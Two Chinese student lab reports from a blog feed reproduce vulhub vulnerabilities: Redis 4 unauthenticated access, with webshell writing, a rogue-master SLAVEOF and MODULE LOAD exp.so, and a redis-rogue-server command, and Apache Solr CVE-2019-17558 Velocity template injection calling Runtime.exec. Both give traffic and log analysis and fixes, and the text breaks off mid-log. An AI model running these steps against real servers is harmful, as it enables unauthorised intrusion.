<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Redis4-unacc未授权访问漏洞复现</title>
    <link href="/2025/08/23/Redis4-unacc%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/08/23/Redis4-unacc%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Redis4-unacc未授权访问漏洞复现"><a href="#Redis4-unacc未授权访问漏洞复现" class="headerlink" title="Redis4-unacc未授权访问漏洞复现"></a>Redis4-unacc未授权访问漏洞复现</h1><h2 id="一、报告目的"><a href="#一、报告目的" class="headerlink" title="一、报告目的"></a>一、报告目的</h2><h3 id="1-1-报告对象：授课老师和一起学习的同学"><a href="#1-1-报告对象：授课老师和一起学习的同学" class="headerlink" title="1.1 报告对象：授课老师和一起学习的同学"></a>1.1 报告对象：授课老师和一起学习的同学</h3><h3 id="1-2-报告目的"><a href="#1-2-报告目的" class="headerlink" title="1.2 报告目的"></a>1.2 报告目的</h3><p>详细阐述 Redis 未授权访问漏洞复现的实验过程，包括环境搭建、漏洞利用步骤等，让读者清晰了解该漏洞的利用原理和危害；深入分析实验过程中产生的日志数据，总结漏洞利用过程中的行为特征，为漏洞防范提供依据；通过实验总结经验教训，提出有效的漏洞修复建议和安全防范措施，提升自身及他人的安全意识和技能。</p><h3 id="1-3-报告评价"><a href="#1-3-报告评价" class="headerlink" title="1.3 报告评价"></a>1.3 报告评价</h3><p>希望老师和同学通过本报告，认可我对 Redis 未授权访问漏洞的深入理解和掌握，肯定我在实验过程中的严谨态度和分析问题的能力。同时，也希望报告中的内容能够对他们在学习和研究网络安全漏洞方面有所帮助，引发更多的思考和讨论。</p><h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><p>Redis 是一个开源的内存数据存储系统，在默认配置下，如果未设置密码且绑定在公网可访问的地址上，就会存在未授权访问漏洞。攻击者可以直接连接 Redis 服务，执行各种命令，如读取、修改数据，甚至通过修改配置文件、加载恶意模块等方式获取服务器权限，导致数据泄露、服务器被控制等严重后果。</p><h2 id="三、漏洞详情说明"><a href="#三、漏洞详情说明" class="headerlink" title="三、漏洞详情说明"></a>三、漏洞详情说明</h2><h3 id="3-1-影响范围"><a href="#3-1-影响范围" class="headerlink" title="3.1 影响范围"></a>3.1 影响范围</h3><p><strong>版本方面</strong>：Redis 2.x、3.x、4.x、5.x 版本都受影响。通常在这些版本中，若采用默认配置且无额外安全防护措施，就可能存在该漏洞风险。</p><p><strong>部署环境方面</strong>：在云服务器、企业内部服务器等各种部署环境中，如果 Redis 绑定在 0.0.0.0:6379 且未添加防火墙规则等安全策略，同时没有设置密码认证或使用弱密码，都可能被未授权访问。如在一些企业自行搭建的私有云环境中，若对 Redis 配置不当，就可能使 Redis 服务暴露在公网上，进而面临风险。</p><p><strong>应用场景方面</strong>：广泛应用于缓存系统、消息队列、实时数据处理等场景的 Redis，一旦出现未授权访问漏洞，在这些场景下都可能导致数据泄露、数据被篡改等问题。比如在电商系统中用 Redis 做缓存，若存在漏洞，攻击者可能获取用户订单、商品库存等敏感信息。</p><h3 id="3-2-评分"><a href="#3-2-评分" class="headerlink" title="3.2 评分"></a>3.2 评分</h3><p>按照常见的漏洞评分系统 CVSS 来衡量，一般可以给到 7 分以上，属于高风险漏洞。</p><p>该漏洞具备利用难度较低，影响范围较广，且危害严重的特点。</p><h3 id="3-3-漏洞详情"><a href="#3-3-漏洞详情" class="headerlink" title="3.3 漏洞详情"></a>3.3 漏洞详情</h3><p>Redis 安装后，若绑定在 0.0.0.0:6379，没有添加防火墙规则等安全策略来避免非信任来源 IP 访问，同时没有设置密码认证或使用弱口令，就会使 Redis 服务暴露在公网上，导致任意能访问目标服务器的用户可未授权访问 Redis，进而读取 Redis 数据。</p><h2 id="四、漏洞存在条件"><a href="#四、漏洞存在条件" class="headerlink" title="四、漏洞存在条件"></a>四、漏洞存在条件</h2><h3 id="网络绑定与暴露方面"><a href="#网络绑定与暴露方面" class="headerlink" title="网络绑定与暴露方面"></a>网络绑定与暴露方面</h3><p>绑定在 0.0.0.0:6379：Redis 默认会绑定在 0.0.0.0:6379 这个地址和端口上，这意味着它可以接受来自任何网络接口的连接请求。如果没有进行额外配置，就为外部访问提供了可能性。</p><p>无防火墙等安全策略：没有添加防火墙规则来限制非信任来源的 IP 访问，或者没有在云服务器安全组等设置中进行访问限制，使得 Redis 服务直接暴露在公网上，外部攻击者可以轻易地访问到 Redis 服务。</p><h3 id="认证设置方面"><a href="#认证设置方面" class="headerlink" title="认证设置方面"></a>认证设置方面</h3><p>未设置密码：没有设置密码认证，即采用默认的无密码状态，或者设置了弱密码，使得攻击者可以无需密码或通过简单猜测就能远程登录到 Redis 服务，直接执行各种命令。</p><h3 id="服务运行权限方面"><a href="#服务运行权限方面" class="headerlink" title="服务运行权限方面"></a>服务运行权限方面</h3><p>以高权限运行：当 Redis 以 root 等具有高权限的用户身份运行时，攻击者利用未授权访问进入后，能够借助高权限进行如写入 SSH 公钥、写入 Webshell、写入计划任务等高危操作，从而进一步控制服务器。</p><h3 id="版本因素方面"><a href="#版本因素方面" class="headerlink" title="版本因素方面"></a>版本因素方面</h3><p>部分版本特性：Redis 2.x、3.x、4.x、5.x 等版本在默认配置下，如果没有进行安全设置，都存在未授权访问的风险。尽管 Redis 3.2 之后增加了 protected-mode，但如果未正确配置或关闭了保护模式，依然可能存在漏洞。</p><h2 id="五、实验工具"><a href="#五、实验工具" class="headerlink" title="五、实验工具"></a>五、实验工具</h2><p>Kali2024攻击机（192.168.144.143）<br>Kali2024靶机（192.168.1144.140）</p><h2 id="六、漏洞复现参考资料"><a href="#六、漏洞复现参考资料" class="headerlink" title="六、漏洞复现参考资料"></a>六、漏洞复现参考资料</h2><p>Secsheep–vulhub漏洞复现之redis 4-unacc 未授权访问漏洞</p><p><a href="http://www.secsheep.top/2023/06/07/vulhub%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0%e4%b9%8bredis-4-unacc-%e6%9c%aa%e6%8e%88%e6%9d%83%e8%ae%bf%e9%97%ae%e6%bc%8f%e6%b4%9e/">http://www.secsheep.top/2023/06/07/vulhub漏洞复现之redis-4-unacc-未授权访问漏洞/</a></p><h2 id="七、操作过程"><a href="#七、操作过程" class="headerlink" title="七、操作过程"></a>七、操作过程</h2><h3 id="1-拉取redis复现环境"><a href="#1-拉取redis复现环境" class="headerlink" title="1.拉取redis复现环境"></a>1.拉取redis复现环境</h3><p>在靶机对应的漏洞文件夹下运行docker compose up，观察容器运行信息可知靶场搭建成功</p><p><img src="/img/wps29.jpg" alt="docker容器运行成功"></p><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>运行docker ps查看到靶场开放在6379端口</p><p><img src="/img/wps30.jpg" alt="查看端口信息"></p><p>在攻击机中通过nmap扫描也能查看到靶机的端口开放信息</p><p><img src="/img/wps31.jpg" alt="nmap扫描结果"></p><h3 id="3-用redis-cli命令远程免密登录redis主机"><a href="#3-用redis-cli命令远程免密登录redis主机" class="headerlink" title="3.用redis-cli命令远程免密登录redis主机"></a>3.用redis-cli命令远程免密登录redis主机</h3><p>利用攻击机安装redis-cli远程连接工具</p><p><img src="/img/wps32.jpg" alt="安装redis-cli"></p><p>用redis-cli命令远程免密登录redis主机，并且通过info查看到redis的基本信息</p><p><img src="/img/wps33.jpg" alt="redis免密登录"></p><h3 id="4-写入shell文件"><a href="#4-写入shell文件" class="headerlink" title="4.写入shell文件"></a>4.写入shell文件</h3><p>因为靶场没有开启web端口无法直接上传木马文件，所以用写入shell文件的方式添加后门</p><p>将dir设置为一个目录A，而dbfilename为文件名B，再执行save或bgsave，则我们就可以写入一个路径为&#x2F;A&#x2F;B的任意文件</p><p>在tmp目录下写入一个test.php的木马文件</p><p><img src="/img/wps34.jpg" alt="写入木马文件"></p><p>在靶机中运行发现命令成功写入</p><p><img src="/img/wps35.jpg" alt="命令成功写入"></p><h3 id="5-使用py脚本执行远程命令"><a href="#5-使用py脚本执行远程命令" class="headerlink" title="5.使用py脚本执行远程命令"></a>5.使用py脚本执行远程命令</h3><p>首先把exp进行下载（git clone失败我选择本地下载上传）</p><p><img src="/img/wps36.jpg" alt="下载exp"></p><p>首先执行make命令，如何再回到redis-rogue-getshell目录下，最后执行<br>python3 redis-rogue-server.py –rhost 192.168.144.140 –lhost 192.168.144.143</p><p><img src="/img/wps37.jpg" alt="执行脚本"></p><p>然后输入i进入交互即可，即可连接成功</p><p><img src="/img/wps38.jpg" alt="成功连接"></p><h2 id="八、数据分析"><a href="#八、数据分析" class="headerlink" title="八、数据分析"></a>八、数据分析</h2><h3 id="8-1-流量分析"><a href="#8-1-流量分析" class="headerlink" title="8.1 流量分析"></a>8.1 流量分析</h3><p>在利用攻击机进行攻击时，我打开wireshark抓包，并存储在csv文件中</p><p><img src="/img/wps39.jpg" alt="抓包分析1"></p><p><img src="/img/wps40.jpg" alt="抓包分析2"></p><p><img src="/img/wps41.jpg" alt="抓包分析3"></p><p><strong>通过对每一条数据包的分析，可以发现该攻击方式的流量特征：</strong></p><ol><li>利用RESP协议发送高危Redis命令：CONFIG SET dir：频繁修改数据库存储路径（如&#x2F;tmp、&#x2F;root&#x2F;.ssh）。</li><li>CONFIG SET dbfilename：设置恶意文件名（如test.php、authorized_keys）。</li><li>SLAVEOF：将靶机设置为攻击机的从节点（如SLAVEOF 192.168.144.143 21000），用于数据同步或写入恶意文件。</li><li>MODULE LOAD：加载动态库（如exp.so），尝试执行任意代码。</li><li>写入Webshell与SSH公钥：<ul><li>Webshell：通过set webshell写入PHP代码<?php phpinfo();?>，并保存为test.php（第5、10、19、22行）。</li><li>SSH公钥：尝试将数据库文件设置为authorized_keys（第38行），但因权限不足失败（第29行显示Permission denied）。</li></ul></li><li>恶意模块加载与清理：<ul><li>加载动态库exp.so（第149行），可能用于反弹Shell或提权。</li><li>攻击后删除恶意文件（第156行rm .&#x2F;exp.so），掩盖攻击痕迹。</li></ul></li><li>TCP Keep-Alive保活探测：<ul><li>大量[TCP Keep-Alive]包（如第8、13、25行等），用于维持连接或探测靶机存活状态。</li></ul></li></ol><h3 id="8-2-日志分析"><a href="#8-2-日志分析" class="headerlink" title="8.2 日志分析"></a>8.2 日志分析</h3><p>我在靶机查看了docker的行为日志，并把日志保存在文件log.txt</p><p><img src="/img/wps42.jpg" alt="日志分析"></p><p>Log.txt记录了 Redis 实例的启动、运行及主从同步过程，结合渗透攻击场景，有诸多异常与潜在攻击迹象：</p><p><strong>未授权访问风险暴露</strong></p><p>日志开头显示 “Warning: no config file specified, using the default config.”，这意味着 Redis 使用默认配置启动。默认配置下，Redis 可能未设置密码，且可能绑定在 0.0.0.0:6379，允许任意 IP 访问，为未授权访问创造了条件。攻击者可借此直接连接 Redis 服务，开展后续攻击。</p><p><strong>主从复制异常操作</strong></p><p>日志多次出现 “SLAVE OF 192.168.144.143:21000 enabled”，表明有人尝试将该 Redis 实例设置为指定主节点的从节点。但连接主节点时多次遭遇 “Connection refused” 错误，却持续尝试连接。这种异常的重复连接行为不符合正常运维操作逻辑，极有可能是攻击者在利用主从复制机制实施攻击</p><p>攻击者可能意图通过控制主节点，使目标 Redis 实例（从节点）同步恶意数据，比如植入后门、篡改数据等。此外，在主从同步过程中，出现 “Wrong signature trying to load DB from file” 和 “Failed trying to load the MASTER synchronization DB from disk” 错误，可能是攻击者干扰了同步数据，破坏数据完整性，或借此让 Redis 实例进入不稳定状态，便于后续利用其他漏洞。</p><p><strong>恶意模块加载迹象</strong></p><p>日志中 “Module’system’ loaded from .&#x2F;exp.so” 记录显示，Redis 加载了一个名为 “system” 的非标准模块，且来源可疑（”exp.so” 文件名暗示可能是恶意工具）。正常情况下，Redis 不会加载此类模块。攻击者很可能利用未授权访问漏洞上传并加载该恶意模块，从而获取额外权限，比如在 Redis 进程所在环境中执行系统命令，实现对宿主机的进一步渗透。</p><p><strong>可疑的命令执行记录</strong></p><p>日志中 “MASTER MODE enabled (user request from ‘id&#x3D;5 addr&#x3D;192.168.144.143:56002 fd&#x3D;9 name&#x3D; age&#x3D;5 idle&#x3D;0 flags&#x3D;N db&#x3D;0 sub&#x3D;0 psub&#x3D;0 multi&#x3D;-1 qbuf&#x3D;0 qbuf-free&#x3D;32768 obl&#x3D;0 oll&#x3D;0 omem&#x3D;0 events&#x3D;r cmd&#x3D;slaveof’)” 表明，有人执行了切换到主模式的命令，且来源 IP 为 192.168.144.143:56002。这一操作结合上述异常，很可能是攻击者为达成特定攻击目的（如数据篡改、权限提升等）而实施的操作，进一步证实了 Redis 实例正遭受恶意攻击。</p><h3 id="8-3-漏洞利用行为总结"><a href="#8-3-漏洞利用行为总结" class="headerlink" title="8.3 漏洞利用行为总结"></a>8.3 漏洞利用行为总结</h3><p><strong>针对漏洞利用过程中的流量和服务器日志进行分析，总结漏洞利用过程中的行为特征如下：</strong></p><p><strong>未授权访问与初始连接</strong>：攻击者利用 Redis 未授权访问漏洞，通过 TCP 协议与目标 Redis 服务器（192.168.144.140）建立连接，如unacc.csv中大量 TCP 连接记录，源 IP192.168.144.143不断与目标交互，且早期连接无认证相关信息，表明可随意访问。</p><p><strong>配置篡改行为</strong>：在unacc.csv中多次出现使用config set命令修改 Redis 配置的操作，如修改工作目录（config set dir &#x2F;tmp）和数据库文件名（config set dbfilename test.php等） 。在log.txt虽未直接显示配置修改的相关报错或确认信息，但从整体攻击逻辑看，这些配置修改为后续恶意操作做准备，可能用于指定恶意文件的存储位置或干扰正常数据存储。</p><p><strong>恶意数据注入</strong>：攻击者通过unacc.csv中的set webshell命令向 Redis 数据库注入恶意代码，如<?php phpinfo();?> ，意图在服务器上创建 Webshell，为后续远程控制服务器提供途径。</p><p>主从复制滥用：log.txt中 Redis 实例尝试设置为从节点（SLAVE OF 192.168.144.143:21000），在连接和同步过程中出现多次错误仍持续尝试。unacc.csv也记录了相关SLAVEOF指令，表明攻击者利用主从复制机制，可能试图从恶意主节点同步数据，实现数据窃取或在目标 Redis 实例中植入恶意数据。</p><p><strong>恶意模块加载</strong>：unacc.csv中有MODULE LOAD .&#x2F;exp.so操作，log.txt显示成功加载system模块（从.&#x2F;exp.so） ，攻击者借助未授权访问上传并加载恶意模块，以获取额外权限，如执行系统命令，对服务器安全造成严重威胁。</p><p><strong>攻击的持续性和试探性</strong>：从unacc.csv的时间序列和操作记录来看，攻击行为持续时间长，且在遇到如连接拒绝（log.txt中同步时的连接拒绝错误）等问题时仍不断尝试不同操作。例如，在修改配置、设置数据、加载模块等操作之间，即便出现错误，攻击者依旧持续进行其他攻击尝试，以实现最终控制服务器或窃取数据的目的。</p><h2 id="九、漏洞修复建议"><a href="#九、漏洞修复建议" class="headerlink" title="九、漏洞修复建议"></a>九、漏洞修复建议</h2><ol><li>升级Redis至最新版本，修复未授权访问漏洞。</li><li>启用Redis认证（requirepass）。</li><li>禁止使用root权限启动redis服务。</li><li>设置 Redis 访问密码在 redis.conf 中找到 “requirepass” 字段在后面填上强口令，redis 客户端也需要此密码来访问 redis 服务。</li><li>添加IP访问限制：配置 bind 选项限定可以连接 Reids 服务器的 IP并修改默认端口 6379</li></ol><h2 id="十、总结"><a href="#十、总结" class="headerlink" title="十、总结"></a>十、总结</h2><p>通过此次漏洞复现，我掌握了vulhub靶场搭建以及远程执行poc代码，并理解了上传webshell的原理，最后通过日志分析和流量分析得出漏洞利用行为的特征，比如注入恶意数据，篡改配置行为。</p>]]></content>
    
    
    <categories>
      
      <category>漏洞挖掘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Redis</tag>
      
      <tag>未授权访问</tag>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>solr 远程命令执行 (CVE-2019-17558)漏洞复现</title>
    <link href="/2025/08/23/solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/08/23/solr%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="solr-远程命令执行-CVE-2019-17558-漏洞复现"><a href="#solr-远程命令执行-CVE-2019-17558-漏洞复现" class="headerlink" title="solr 远程命令执行 (CVE-2019-17558)漏洞复现"></a>solr 远程命令执行 (CVE-2019-17558)漏洞复现</h1><h2 id="一、报告目的"><a href="#一、报告目的" class="headerlink" title="一、报告目的"></a>一、报告目的</h2><h3 id="1-1-报告对象"><a href="#1-1-报告对象" class="headerlink" title="1.1 报告对象"></a>1.1 报告对象</h3><p>系统安全运维人员：该报告提供了 Apache Solr 中 CVE-2019-17558 漏洞的详细复现过程，可以帮助运维人员理解漏洞的特性，识别系统是否受到影响，并采取相应的安全加固措施。</p><p>渗透测试人员：报告展示了漏洞的利用方法和攻击特征，有助于渗透测试人员了解如何验证目标系统的漏洞是否存在，并模拟攻击进行漏洞评估。</p><p>开发团队：本报告详细分析了漏洞的根源和影响，开发团队可以借此了解如何在未来的开发过程中避免类似的安全问题，提升代码的安全性。</p><p>管理层人员：对于关注公司网络安全、IT架构安全的管理人员，本报告提供了该漏洞可能带来的安全风险评估和危害分析，帮助管理层做出安全决策。</p><h3 id="1-2-报告目的"><a href="#1-2-报告目的" class="headerlink" title="1.2 报告目的"></a>1.2 报告目的</h3><p>本报告的目的在于分析和复现 Apache Solr 中的远程代码执行漏洞（CVE-2019-17558）。报告通过漏洞复现过程展示漏洞存在的风险，提供相应的攻击方式和应对措施，为相关技术人员提供必要的修复建议。</p><h3 id="1-3-报告评价"><a href="#1-3-报告评价" class="headerlink" title="1.3 报告评价"></a>1.3 报告评价</h3><p>读者通过阅读本报告，应该能获得以下评价与收获：</p><p>安全意识提升： 读者将对 CVE-2019-17558 漏洞的性质有清晰的理解，能够认识到即使是看似不起眼的配置错误也可能导致严重的远程代码执行风险，从而提升日常开发和运维过程中的安全意识。</p><p>漏洞识别能力增强： 通过报告中的漏洞复现过程，读者能够掌握如何识别类似的漏洞并采取相应的防护措施，增强渗透测试和漏洞检测的能力。</p><p>实际操作经验： 渗透测试人员和安全运维人员能够通过报告中提供的实际攻击步骤和漏洞利用方法，获得实战操作经验，提升应对实际攻击的能力。</p><p>修复和防御措施指导： 通过具体的修复建议，读者能够在自己的系统中迅速定位问题并采取措施修复漏洞，防止类似漏洞的发生，提升系统的安全性。</p><h2 id="二、实验原理"><a href="#二、实验原理" class="headerlink" title="二、实验原理"></a>二、实验原理</h2><h3 id="漏洞背景"><a href="#漏洞背景" class="headerlink" title="漏洞背景"></a>漏洞背景</h3><ol><li>Apache Solr 是一个开源的搜索平台，广泛用于企业级搜索应用。</li><li>Velocity 模板引擎 是一种用于在应用程序中生成动态内容的工具，Solr 使用它来处理一些请求和响应的渲染。</li><li>通过 Velocity 模板注入，攻击者可以在 Solr 请求中嵌入恶意模板，利用 Solr 系统中的执行环境来运行任意 Java 代码。</li></ol><h3 id="漏洞触发条件"><a href="#漏洞触发条件" class="headerlink" title="漏洞触发条件"></a>漏洞触发条件</h3><ol><li>params.resource.loader.enabled 配置项默认为 false，但它可以被恶意请求修改为 true，这样 Solr 就允许外部加载资源文件。</li><li>通过构造带有恶意 Velocity 模板的请求，攻击者能够绕过系统的安全限制，执行任意的 Java 代码。</li></ol><h3 id="漏洞利用流程"><a href="#漏洞利用流程" class="headerlink" title="漏洞利用流程"></a>漏洞利用流程</h3><ol><li>攻击者首先需要访问 Solr 的某个特定端点，通常是 &#x2F;select 或 &#x2F;update，并且能够在请求中插入任意的查询参数。</li><li>在 CVE-2019-17558 中，攻击者利用 Solr 的 wt&#x3D;velocity（Velocity 渲染模板）参数和恶意的模板参数来构造请求。</li><li>恶意模板注入：攻击者通过构造请求将恶意的 Velocity 模板注入到请求参数中，使得服务器在处理请求时执行这些模板，达到执行任意代码的目的。</li></ol><h2 id="三、漏洞详细情况说明"><a href="#三、漏洞详细情况说明" class="headerlink" title="三、漏洞详细情况说明"></a>三、漏洞详细情况说明</h2><h3 id="3-1-影响范围"><a href="#3-1-影响范围" class="headerlink" title="3.1 影响范围"></a>3.1 影响范围</h3><p><strong>受影响的版本：</strong></p><p>此漏洞影响 Apache Solr 5.0.0 至 8.3.1 版本。只有在使用 Velocity Response Writer 的场景下，且相关配置项（例如 params.resource.loader.enabled 和 solr.resource.loader.enabled）被错误地启用时，漏洞才会被触发。</p><p><strong>配置和部署条件：</strong></p><p>仅在 Velocity 模板引擎被启用，并允许外部资源加载的情况下，攻击者才能利用该漏洞。因此，默认配置下风险较低，但许多用户为了扩展功能或调试时可能会手动修改配置，从而引入安全隐患。</p><p><strong>可能受影响的系统：</strong></p><ul><li>搜索和数据索引系统： 依赖 Apache Solr 进行搜索和数据索引的企业应用。</li><li>企业级搜索解决方案： 部署在企业内部或面向公网的搜索平台。</li><li>Web 应用和大数据平台： 集成 Solr 服务的 Web 应用或大数据处理系统，尤其是那些直接对外开放的服务。</li></ul><p><strong>潜在风险与后果：</strong></p><p>漏洞可导致远程代码执行，使攻击者能够在受影响的服务器上执行任意命令，进而可能获取系统权限。</p><p>如果 Solr 实例部署在公共网络或缺乏有效访问控制，攻击者利用该漏洞可以轻易突破防御，造成数据泄露、服务中断或系统完全失控。</p><h3 id="3-2-评分"><a href="#3-2-评分" class="headerlink" title="3.2 评分"></a>3.2 评分</h3><p>CVE-2019-17558 漏洞的 CVSS v3.0 评分为 8.8，属于高风险漏洞，建议尽快修复该漏洞，特别是系统暴露在公共网络上时。</p><h3 id="3-3-漏洞详情"><a href="#3-3-漏洞详情" class="headerlink" title="3.3 漏洞详情"></a>3.3 漏洞详情</h3><p>CVE-2019-17558 是一个影响 Apache Solr 的远程代码执行漏洞，存在于 Velocity 模板引擎的配置中。攻击者通过构造恶意请求，利用未正确禁用的外部资源加载器，注入 Velocity 模板并执行任意 Java 代码。此漏洞影响 Apache Solr 版本 5.0.0 至 8.3.1，允许攻击者远程执行命令、获取敏感信息或完全控制受影响系统。修复方法是升级 Solr 至 8.4.0 及更高版本，并禁用外部资源加载器。</p><h2 id="四、漏洞存在条件"><a href="#四、漏洞存在条件" class="headerlink" title="四、漏洞存在条件"></a>四、漏洞存在条件</h2><p>Velocity 模板引擎启用：Solr 必须启用 Velocity 模板引擎来处理请求，特别是 wt&#x3D;velocity（Velocity 响应类型）配置项被使用时。</p><p>外部资源加载器未禁用：Solr 配置中的 params.resource.loader.enabled 或 solr.resource.loader.enabled 设置为 true，允许加载外部资源文件。这使得攻击者能够通过构造恶意请求，加载并执行未经授权的 Velocity 模板。</p><p>使用的 Solr 版本：漏洞存在于 Apache Solr 版本 5.0.0 至 8.3.1 中。没有及时升级的系统容易受到该漏洞的影响。</p><h2 id="五、实验工具"><a href="#五、实验工具" class="headerlink" title="五、实验工具"></a>五、实验工具</h2><p>Windows攻击机（192.168.144.138）<br>Kali2024靶机（192.168.1144.140）</p><h2 id="六、漏洞复现参考资料"><a href="#六、漏洞复现参考资料" class="headerlink" title="六、漏洞复现参考资料"></a>六、漏洞复现参考资料</h2><p><a href="https://blog.csdn.net/YouthBelief/article/details/121083848?spm=1001.2101.3001.6650.12&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-12-121083848-blog-143815528.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1">https://blog.csdn.net/YouthBelief/article/details/121083848?spm=1001.2101.3001.6650.12&amp;utm_medium&#x3D;distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-12-121083848-blog-143815528.235%5Ev43%5Epc_blog_bottom_relevance_base3&amp;depth_1</a></p><h2 id="七、操作过程"><a href="#七、操作过程" class="headerlink" title="七、操作过程"></a>七、操作过程</h2><h3 id="1-拉取CVE-2019-17558复现环境"><a href="#1-拉取CVE-2019-17558复现环境" class="headerlink" title="1.拉取CVE-2019-17558复现环境"></a>1.拉取CVE-2019-17558复现环境</h3><p>在靶机对应的漏洞文件夹下运行docker compose up</p><p><img src="/img/wps1-1755936631060-1.jpg" alt="运行docker compose up"></p><p>运行docker ps可查看容器运行情况</p><p><img src="/img/wps2-1755936631061-2.jpg" alt="查看容器状态"></p><p>由图可知，容器成功运行在本机8983端口</p><h3 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h3><p>在攻击机中利用fscan 运行命令：fscan.exe -h 192.168.144.140</p><p><img src="/img/wps3-1755936631061-4.jpg" alt="fscan扫描结果"></p><p>发现靶机的开放了两个端口分别是8983和8834</p><p>接着用nmap扫描开放的端口的对应服务</p><p><img src="/img/wps4-1755936631061-3.jpg" alt="nmap扫描结果"></p><p>发现8983端口的对应服务为apache solr,即可确定渗透注入点</p><p>用dirsearch运行命令： dirsearch -u <a href="http://192.168.144.140:8983，进行目录探测">http://192.168.144.140:8983，进行目录探测</a></p><p><img src="/img/wps5-1755936631061-7.jpg" alt="目录探测结果"></p><p>在浏览器中进行访问，并没有发现明显漏洞注入点</p><h3 id="3-漏洞利用"><a href="#3-漏洞利用" class="headerlink" title="3.漏洞利用"></a>3.漏洞利用</h3><p>默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。可以先通过如下API获取所有的核心</p><p>在vulhub中核心就是demo</p><p>通过下边API获取所有内核名称</p><p><a href="http://118.193.36.37:8468/solr/admin/cores?indexInfo=false&wt=json">http://118.193.36.37:8468/solr/admin/cores?indexInfo=false&amp;wt=json</a></p><p><img src="/img/wps6-1755936631061-5.jpg" alt="获取核心名称"></p><p>在url访问&#x2F;solr&#x2F;demo&#x2F;config</p><p><img src="/img/wps7-1755936631061-6.jpg" alt="访问配置"></p><p>发现状态码为400，即访问失败</p><p>启用配置 params.resource.loader.enabled 为true，在url访问&#x2F;solr&#x2F;demo&#x2F;config，burpsuit抓包</p><p><img src="/img/wps8-1755936631061-8.jpg" alt="burpsuit抓包"></p><p>改成POST然后修改启动配置，修改请求体</p><p><img src="/img/wps9-1755936631061-9.jpg" alt="修改请求"></p><p>最后发现页面成功回显</p><p><img src="/img/wps10-1755936631061-10.jpg" alt="成功回显"></p><p>成功将启用配置 params.resource.loader.enabled 为true</p><p>利用hackbar插件注入 Velocity 模板即可执行任意命令</p><p><img src="/img/wps11-1755936631061-11.jpg" alt="执行命令"></p><p>最终成功执行ls命令，得到所有隐私目录</p><h2 id="八、数据分析"><a href="#八、数据分析" class="headerlink" title="八、数据分析"></a>八、数据分析</h2><h3 id="8-1-流量分析"><a href="#8-1-流量分析" class="headerlink" title="8.1 流量分析"></a>8.1 流量分析</h3><p>在利用攻击机进行攻击时，我打开wireshark抓包，并存储在csv文件中</p><p><img src="/img/wps12-1755936631061-12.jpg" alt="抓包数据1"></p><p><img src="/img/wps13-1755936631061-13.jpg" alt="抓包数据2"></p><p><strong>通过对每一条数据包的分析，可以发现该攻击方式的流量特征：</strong></p><ol><li>目标端口固定</li></ol><p>流量主要集中在源端口 50373、50376 与目的端口 8983 之间的通信，8983 端口通常是 Solr 服务的默认端口，这表明攻击者的目标明确指向 Solr 服务。</p><ol start="2"><li>攻击请求特征</li></ol><p>多次出现包含恶意参数的 HTTP GET 请求，请求路径为 &#x2F;solr&#x2F;demo&#x2F;select，且带有 wt&#x3D;velocity 和 v.template&#x3D;custom 参数，这是利用 Solr 的 Velocity 模板注入漏洞（CVE - 2019 - 17558）的典型特征。请求中还包含通过反射调用 java.lang.Runtime 类并执行系统命令（如 ls）的代码</p><ol start="3"><li>请求频率较高</li></ol><p>在短时间内（如 1.055052 秒和 1.518454 秒）出现多次相同的攻击请求，这可能是攻击者在尝试不同的命令或者确认攻击是否成功，体现了攻击者试图利用漏洞的急切性</p><ol start="4"><li>响应状态正常</li></ol><p>针对攻击请求，服务器返回了 HTTP&#x2F;1.1 200 OK 的响应，说明服务器正常处理了请求，但这并不意味着攻击未成功，有可能攻击代码已经在服务器端执行。</p><ol start="5"><li>存在 TCP Keep - Alive 机制</li></ol><p>在攻击过程中，存在大量的 TCP Keep - Alive 数据包，用于维持连接的有效性，这有助于攻击者在较长时间内持续进行攻击或者获取攻击结果。例如：</p><h3 id="8-2-日志分析"><a href="#8-2-日志分析" class="headerlink" title="8.2 日志分析"></a>8.2 日志分析</h3><p>我在靶机查看了docker的行为日志，并把日志保存在文件log.txt</p><p><img src="/img/wps14-1755936631061-14.jpg" alt="日志分析"></p><p><strong>日志特征</strong></p><p><strong>1.Velocity 模板注入痕迹</strong></p><p>ERROR [qtp1947426831-24] o.a.s.s.SolrDispatchFilter handleException] org.apache.velocity.exception.MethodInvocationException: Invocation of method ‘exec’ in class ‘java.lang.Runtime’ failed</p><p>分析：攻击 Payload 通过v.template&#x3D;custom参数注入 Velocity 代码，若执行失败（如命令语法错误），Solr 会记录 Velocity 引擎抛出的异常。</p><p><strong>2.反射调用异常</strong></p><p>Caused by: java.lang.NoSuchMethodException: java.lang.Runtime.exec([Ljava.lang.String;)java.lang.Process</p><p>分析：攻击 Payload 通过反射调用java.lang.Runtime.exec执行命令，若参数格式错误（如缺少数组括号），会触发NoSuchMethodException。</p><p><strong>3.命令执行失败记录</strong></p><p>java.io.IOException: Cannot run program “ls”: error&#x3D;2, No such file or 